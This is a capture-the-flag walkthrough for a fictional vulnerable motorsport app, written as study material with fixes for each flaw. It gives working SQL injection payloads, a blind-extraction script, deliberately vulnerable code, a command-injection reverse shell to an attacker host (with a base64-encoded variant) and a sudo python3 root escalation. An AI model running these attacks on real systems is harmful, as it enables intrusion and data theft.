# ForgeTrack — Full Walkthrough

> **Authorized lab material.** Every command here was executed against the isolated ForgeTrack instance at `http://localhost:8080`. Never run these payloads against a system you do not own or have written permission to test.

ForgeTrack is a fictional motorsport management app (Flask + PostgreSQL). The room has two layers:

- **Web layer** — four SQL injection objectives and one secure comparison route.
- **OS layer** — a deliberately vulnerable diagnostics page that gives a `www-data` shell, followed by a weak `sudo` rule for root.

The goal is not just to grab flags, but to explain *why* each weakness works and how to fix it.

---

## Lab at a glance

| # | Objective | Route | Input | Flag |
|---|---|---|---|---|
| 1 | Visible search injection | `/builds/search?query=` | `query` | `RFM{search_breach_confirmed}` |
| 2 | UNION record extraction | `/builds/view?id=` | `id` | `RFM{the_forge_has_a_hidden_lane}` |
| 3 | Blind boolean inference | `/telemetry/check?session=` | `session` | `RFM{telemetry_never_stays_silent}` |
| 4 | Remediation retest | `/secure/builds/search?query=` | `query` | `RFM{secure_build_verified}` |
| 5 | Web-to-OS foothold | `/diagnostics/ping?host=` | `host` | `www-data` shell |
| 6 | Privilege escalation | `sudo` / `python3` | — | `root` shell + `/root/root.txt` |

| Page | Purpose |
|---|---|
| `/` | Dashboard |
| `/cars`, `/drivers`, `/events` | Public fleet and calendar data |
| `/builds` | Released build registry (links to `/builds/view?id=N`) |
| `/telemetry` | Recorded sessions (gives you valid session codes) |
| `/login`, `/team-chat` | Authenticated team features |
| `/garage/manage`, `/drivers/manage` | Crew-only admin pages |

---

## 0. Start the lab

### Option A — Docker Compose

```bash
cd redline-forge
docker compose up --build -d
docker compose ps
```

Open the app:

- `docker-compose.yml` publishes `"80:8080"`, so the app is at **http://localhost** (port 80).
- The README says port 8080. Either browse port 80, or change the mapping to `ports: ["8080:8080"]` and use **http://localhost:8080**.

All commands below assume `http://localhost:8080`; substitute `http://localhost` if you kept the Compose default.

### Option B — Native PostgreSQL + Gunicorn (no Docker)

Use a **fresh** PostgreSQL cluster: `init.sql` creates the `forge_owner` and `forge_app` roles and will error if they already exist.

```bash
sudo -u postgres createdb forgetrack
sudo -u postgres psql -d forgetrack -v ON_ERROR_STOP=1 -f database/init.sql
sudo -u postgres psql -d forgetrack -v ON_ERROR_STOP=1 -f database/seed.sql

python3 -m venv .venv
.venv/bin/pip install -r app/requirements.txt

cd app
DATABASE_URL='postgresql://forge_app:forge_app_lab_password@127.0.0.1:5432/forgetrack' \
SECRET_KEY='local-lab-only' \
../.venv/bin/gunicorn --bind 0.0.0.0:8080 --workers 2 app:app
```

Requirements for the foothold:

```bash
sudo apt install -y iputils-ping     # /diagnostics/ping shells out to ping
```

On a dev host, Gunicorn runs as **your** user, so `/diagnostics/ping` returns your UID. The `www-data` shell and the weak `sudo` rule exist only on the packaged VM.

### Reset between attempts

```bash
./scripts/reset.sh          # Docker: wipes the volume and reloads seed data
```

### Seeded accounts (optional — the SQLi challenges do not need a login)

| Username | Password | Role |
|---|---|---|
| `pitwall.27` | `ForgePitwall27!` | Crew — Race Engineer |
| `sora.kade` | `ForgeSoraKade!` | Crew — Workshop Lead |
| `nova.88` | `ForgeNova88!` | Racer |
| `vortex.41` | `ForgeVortex41!` | Racer |
| `slipstream.09` | `ForgeSlipstream09!` | Racer |

> If these were changed during lab preparation, check `database/seed.sql`; only scrypt hashes are stored there, so plaintext cannot be recovered from the database.

---

## 1. Reconnaissance

Start with normal requests so you know what "working" looks like.

```bash
# Released builds
curl -sS http://localhost:8080/builds | grep -o '<tr>.*</tr>'

# A normal search
curl -sS --get --data-urlencode "query=Apex" \
  http://localhost:8080/builds/search | grep -o '<tr>.*</tr>'
```

Normal search result:

```text
B-2407 | Apex endurance package | Released | Porsche 911 GT3 RS | Validated at Ember Circuit
```

Open a build record directly:

```bash
curl -sS 'http://localhost:8080/builds/view?id=1' | grep -o '<h2>.*</h2>'
```

The record page renders these fields: **build code, name, status, car, notes** — plus the numeric `id`, which the page does not print. That is **six selected columns**, and remembering it is what makes the UNION step easy.

### Telemetry baseline

```bash
# Valid session -> 200
curl -sS -o /dev/null -w '%{http_code}\n' \
  --get --data-urlencode "session=EMB-Q1-07" \
  http://localhost:8080/telemetry/check

# Invalid session -> 404
curl -sS -o /dev/null -w '%{http_code}\n' \
  --get --data-urlencode "session=not-a-real-session" \
  http://localhost:8080/telemetry/check
```

```text
200
404
```

The page body changes too: `Archive record located` versus `No archive record`. That 200/404 difference is the data channel for Challenge 3.

Also note the session codes on `/telemetry`:

```bash
curl -sS http://localhost:8080/telemetry | grep -o 'EMB-[A-Z0-9-]*'
```

---

## 2. Challenge 1 — Visible search injection

**Flag:** `RFM{search_breach_confirmed}`

### The vulnerable code

`app/app.py` builds the query with string concatenation:

```python
sql = ("SELECT b.id,b.build_code,b.name,b.status,c.car_code,COALESCE(b.notes,'') AS notes "
       "FROM builds b JOIN cars c ON c.id=b.car_id "
       "WHERE b.restricted=false AND (b.name ILIKE '%" + query + "%' "
       "OR b.build_code ILIKE '%" + query + "%') ORDER BY b.id")
```

### First attempt (and why it fails)

The obvious payload is:

```sql
' UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- 
```

Paste that into the search box and you get **0 matching records**. Nothing is broken — the payload is simply in the wrong place.

The generated SQL becomes:

```sql
... AND (b.name ILIKE '%' UNION SELECT ... -- %' OR b.build_code ILIKE '%' UNION ...)
```

The `UNION` is **inside a parenthesised boolean expression**. PostgreSQL rejects that, and the app swallows the error and renders an empty table. You need to close the `(` before the `UNION`.

### Working payload

```sql
%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- 
```

The generated SQL is now:

```sql
... AND (b.name ILIKE '%%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved'
FROM flags WHERE challenge='search' -- %' OR b.build_code ILIKE '%%') ORDER BY b.id
```

`ILIKE '%%'` returns every released build, the `)` closes the original group, the `UNION` appends our row, and `-- ` comments out the rest.

### Run it

```bash
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " \
  http://localhost:8080/builds/search | grep -o 'RFM{[^}]*}'
```

```text
RFM{search_breach_confirmed}
```

In a browser, use this pre-encoded URL:

```text
http://localhost:8080/builds/search?query=%25%27%20%29%20UNION%20SELECT%201%2Cchallenge%2Cflag_value%2C%27flag%27%2C%27lab%27%2C%27retrieved%27%20FROM%20flags%20WHERE%20challenge%3D%27search%27%20--%20
```

The flag appears as an extra row in the normal results table — build code `search`, name `RFM{...}`, status `flag`, car `lab`, notes `retrieved`.

**Why six values?** The original `SELECT` returns `id, build_code, name, status, car_code, notes`. A `UNION` requires the same number of columns with compatible types, so `1` (int) plus five text values.

---

## 3. Challenge 2 — UNION record extraction

**Flag:** `RFM{the_forge_has_a_hidden_lane}`

`/builds/view` concatenates `id` straight into the query:

```python
sql = ("SELECT b.id,b.build_code,b.name,b.status,c.car_code,COALESCE(b.notes,'') "
       "FROM builds b JOIN cars c ON c.id=b.car_id WHERE b.id=" + build_id)
```

There is no quote to break out of — it is a numeric context, so supply a non-matching id and inject with `UNION`.

### Payload

```sql
0 UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='union' -- 
```

```bash
curl -sS --get \
  --data-urlencode "id=0 UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='union' -- " \
  http://localhost:8080/builds/view | grep -o 'RFM{[^}]*}'
```

```text
RFM{the_forge_has_a_hidden_lane}
```

Browser URL:

```text
http://localhost:8080/builds/view?id=0%20UNION%20SELECT%201%2Cchallenge%2Cflag_value%2C%27flag%27%2C%27lab%27%2C%27retrieved%27%20FROM%20flags%20WHERE%20challenge%3D%27union%27%20--%20
```

### Column mapping

| Position | Normal meaning | Injected value |
|---|---|---|
| 1 | `id` | `1` |
| 2 | `build_code` | `challenge` |
| 3 | `name` | `flag_value` |
| 4 | `status` | `flag` |
| 5 | `car_code` | `lab` |
| 6 | `notes` | `retrieved` |

The page renders the flag in the panel heading, e.g. `union · RFM{the_forge_has_a_hidden_lane}`.

---

## 4. Challenge 3 — Blind boolean inference

**Flag:** `RFM{telemetry_never_stays_silent}`

`/telemetry/check` never prints a database value. It only tells you whether the query returned a row:

```python
sql = "SELECT 1 FROM telemetry WHERE session_code='" + session + "' LIMIT 1"
```

Status code is the oracle: **200 = true, 404 = false**.

### Confirm the oracle

```bash
# true -> 200
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=x' OR 1=1 -- " \
  http://localhost:8080/telemetry/check

# false -> 404
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=x' OR 1=2 -- " \
  http://localhost:8080/telemetry/check
```

### Test a prefix

```sql
x' OR (SELECT flag_value FROM flags WHERE challenge='blind') LIKE 'RFM{t%' -- 
```

```bash
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=x' OR (SELECT flag_value FROM flags WHERE challenge='blind') LIKE 'RFM{t%' -- " \
  http://localhost:8080/telemetry/check
```

```text
200
```

Change `t` to `z` and you get `404`. That single bit is enough to walk the whole string.

### Manual loop

1. Start with `RFM{`.
2. Try each candidate character: `a–z`, `0–9`, `_`, `}`.
3. Send `LIKE '<prefix><candidate>%'`.
4. Keep the character that returns `200`.
5. Stop when `}` is confirmed.

**Careful:** `_` is a wildcard in `LIKE`, so prefixes containing an underscore can match more than you intend. For the automated version below, use `substring()` with an equality test instead — it has no wildcards.

### Automated extraction (tested, no dependencies)

```python
import urllib.parse, urllib.request

BASE = "http://localhost:8080/telemetry/check"
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_{}"

def matches(prefix):
    n = len(prefix)
    expr = f"(SELECT substring(flag_value,1,{n}) FROM flags WHERE challenge='blind')"
    payload = f"x' OR {expr} = '{prefix}' -- "
    url = BASE + "?" + urllib.parse.urlencode({"session": payload})
    try:
        with urllib.request.urlopen(url, timeout=5) as response:
            return response.status == 200
    except urllib.error.HTTPError as error:
        return error.code == 200

prefix = "RFM{"
while not prefix.endswith("}"):
    for character in ALPHABET:
        if matches(prefix + character):
            prefix += character
            print(prefix, flush=True)
            break
    else:
        raise SystemExit(f"no character matched after {prefix}")

print("FLAG:", prefix)
```

Output ends with:

```text
FLAG: RFM{telemetry_never_stays_silent}
```

Roughly 30 characters × ~40 requests; it finishes in a few seconds locally.

---

## 5. Challenge 4 — Remediation retest

**Flag:** `RFM{secure_build_verified}`

`/secure/builds/search` implements the same feature with a parameterized query:

```python
results = rows(
    "SELECT ... WHERE b.restricted=false AND (b.name ILIKE %s OR b.build_code ILIKE %s) ORDER BY b.id",
    (f"%{query}%", f"%{query}%"),
)
```

Replay the Challenge 1 payload against it:

```bash
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " \
  http://localhost:8080/secure/builds/search | grep -c 'RFM{'
```

```text
0
```

No injected row. The driver sends the whole string as a **value**, so the `)` and `UNION` are just characters inside the `ILIKE` pattern; they can no longer change the statement's structure.

Write the remediation objective as:

```text
RFM{secure_build_verified}
```

---

## 6. OS foothold — command injection in diagnostics

**Goal:** move from the web app to a shell as the account running Gunicorn (`www-data` on the packaged VM).

The app ships a "network diagnostics" helper that shells out to `ping`:

```python
# app/lab_diagnostics.py  — INTENTIONALLY VULNERABLE
output = subprocess.check_output(
    f"ping -c 1 -W 2 {host}",
    shell=True,
    stderr=subprocess.STDOUT,
    text=True,
    timeout=10,
)
```

`shell=True` plus unsanitised input means everything after `;`, `&&`, or `|` runs as a second command.

### Confirm the injection

```bash
curl -sS --get --data-urlencode 'host=127.0.0.1; id' \
  http://localhost:8080/diagnostics/ping | grep -oE 'uid=[0-9]+\([^)]*\)'
```

```text
uid=33(www-data)          # native VM build (systemd runs the app as www-data)
uid=999(forge)            # Docker image (Dockerfile creates the forge user)
uid=1000(your-user)       # local dev host — the dev server runs as you
```

The account depends on how Gunicorn was started, not on the payload. The room VM uses the native build, so expect `www-data`.

### Reverse shell

Start a listener on your attack machine:

```bash
nc -lvnp 4444
```

Send a payload that connects back:

```bash
curl -sS --get \
  --data-urlencode "host=127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >/dev/null 2>&1 &" \
  http://TARGET_IP/diagnostics/ping
```

If quoting gets mangled, base64-encode the inner command:

```bash
PAYLOAD=$(printf '%s' "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64 -w0)
curl -sS --get \
  --data-urlencode "host=127.0.0.1; echo $PAYLOAD | base64 -d | bash &" \
  http://TARGET_IP/diagnostics/ping
```

### Upgrade the shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

### User flag

The room places the user flag at `/home/forge/user.txt`:

```bash
cat /home/forge/user.txt
```

> The flag value is set by the room author when the VM is built. On a dev host without `/home/forge`, this file will not exist.

---

## 7. Privilege escalation — weak sudo rule

**Goal:** go from `www-data` to `root`.

### Enumerate

```bash
id
sudo -n -l
```

The room deliberately grants the web account passwordless Python:

```text
User www-data may run the following commands on <hostname>:
    (root) NOPASSWD: /usr/bin/python3
```

Check for it directly:

```bash
sudo -n -l 2>/dev/null | grep -i python
```

### Exploit

`python3` can spawn a shell, and it runs as root because of the sudo rule:

```bash
sudo -n /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

Confirm:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Root flag

```bash
cat /root/root.txt
```

### Why this works

The rule restricts the *binary*, not what that binary can do. Python is a general-purpose interpreter, so `NOPASSWD: /usr/bin/python3` is effectively `NOPASSWD: ALL`. Safe alternatives are to avoid giving interpreters sudo rights at all, or to expose a single-purpose wrapper script with fixed arguments that the user cannot influence.

> This rule exists only on the packaged VM. A normal dev host will not have it, and `sudo -n -l` will fail with "a password is required".

---

## Flag summary

| Objective | Flag |
|---|---|
| Search injection | `RFM{search_breach_confirmed}` |
| UNION extraction | `RFM{the_forge_has_a_hidden_lane}` |
| Blind inference | `RFM{telemetry_never_stays_silent}` |
| Remediation retest | `RFM{secure_build_verified}` |
| User (VM) | `/home/forge/user.txt` |
| Root (VM) | `/root/root.txt` |

---

## 8. Root cause and fix

The SQL bugs are the same mistake in different shapes: **query text is built by concatenation**. The OS bugs are separate misconfigurations.

| Route / control | Problem | Fix |
|---|---|---|
| `/builds/search` | `query` concatenated inside `ILIKE '%...%'` | Bind `%query%` as a parameter |
| `/builds/view` | `id` concatenated as a number | Bind it and cast with `int` |
| `/telemetry/check` | `session` concatenated inside quotes | Bind it as a parameter |
| `/diagnostics/ping` | `shell=True` with user input | Use an argument list without a shell, validate the host, and never pass raw input to `ping` |
| `sudoers` | `NOPASSWD: /usr/bin/python3` for `www-data` | Remove interpreter sudo rights; use a fixed-argument wrapper if a privileged action is genuinely required |

```python
# vulnerable
sql = "... WHERE b.id=" + build_id

# fixed
record = rows("... WHERE b.id=%s", (build_id,))
```

Defence in depth used by this lab:

- **Parameterized queries** everywhere (`%s` placeholders with a tuple of values).
- **Least privilege:** the app connects as `forge_app`, which has `SELECT/INSERT/UPDATE` but no `DELETE`, no DDL, and no superuser rights.
- **Error handling:** the app logs database errors instead of returning them to the browser. This reduces information leakage, but it does **not** fix injection — note that Challenges 1–3 still work with errors suppressed.
- **No dynamic identifiers:** never parameterize table or column names from user input; map them through an allow-list instead.

---

## 9. Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `0 matching record(s)` for a UNION payload | `UNION` is still inside the `(...)` group | Close it with `%' )` before `UNION` |
| Every request returns 500 | PostgreSQL not reachable | Check `DATABASE_URL` and that the `db` container/service is healthy |
| `/builds` is empty after editing `seed.sql` | Init scripts only run on a fresh volume | `./scripts/reset.sh` or `docker compose down -v && docker compose up --build -d` |
| Port 80 already in use | Compose maps `80:8080` | Change the left side of the port mapping |
| Blind script stalls on `_` | `_` is a `LIKE` wildcard | Use the `substring()` script above |
| `/diagnostics` returns 404 | App running from an older checkout without the blueprint | Ensure `app/lab_diagnostics.py` exists and `app.py` registers `lab_bp` |
| `ping: command not found` in the output | `iputils-ping` is not installed (the Docker `python:3.12-slim` image lacks it) | `apt install iputils-ping` on the VM, or add `RUN apt-get update && apt-get install -y iputils-ping` to `app/Dockerfile`. The injection still works because `;` runs the next command after `ping` fails |
| Injection returns `uid=999(forge)` | You are using Docker; the image runs as `forge` | Expected. The native VM runs as `www-data` |
| Injection returns `uid=1000(...)` | Dev server started as your own user | On the VM, run Gunicorn as `www-data` (systemd unit does this) |
| `sudo -n -l` asks for a password | The weak sudo rule is not installed on a dev host | Expected; the rule exists only on the packaged VM |

---

## 10. One-page command sheet

```bash
BASE=http://localhost:8080

# Baseline
curl -sS --get --data-urlencode "query=Apex" "$BASE/builds/search"

# Challenge 1
curl -sS --get --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " "$BASE/builds/search"

# Challenge 2
curl -sS --get --data-urlencode "id=0 UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='union' -- " "$BASE/builds/view"

# Challenge 3 (oracle)
curl -sS -o /dev/null -w '%{http_code}\n' --get --data-urlencode "session=x' OR 1=1 -- " "$BASE/telemetry/check"

# Challenge 4
curl -sS --get --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " "$BASE/secure/builds/search"

# Foothold: confirm command execution
curl -sS --get --data-urlencode 'host=127.0.0.1; id' "$BASE/diagnostics/ping"

# Foothold: reverse shell (replace with your listener)
curl -sS --get --data-urlencode "host=127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >/dev/null 2>&1 &" "$BASE/diagnostics/ping"
```

On the shell:

```bash
# Enumerate and escalate
sudo -n -l
sudo -n /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
id

# Flags
cat /home/forge/user.txt
cat /root/root.txt
```

---

## 11. Completion checklist

- [ ] Mapped the app and captured normal responses.
- [ ] Explained why the first search payload failed (parenthesis) and fixed it.
- [ ] Retrieved all four web flags with the exact requests above.
- [ ] Explained the six-column UNION shape.
- [ ] Demonstrated the 200/404 blind oracle and automated it.
- [ ] Showed the secure route rejects the same input.
- [ ] Got a shell through `/diagnostics/ping` and identified the web account.
- [ ] Enumerated `sudo` and escalated to root through `python3`.
- [ ] Captured the user and root flags.
- [ ] Wrote up impact, root cause, and remediation with evidence.
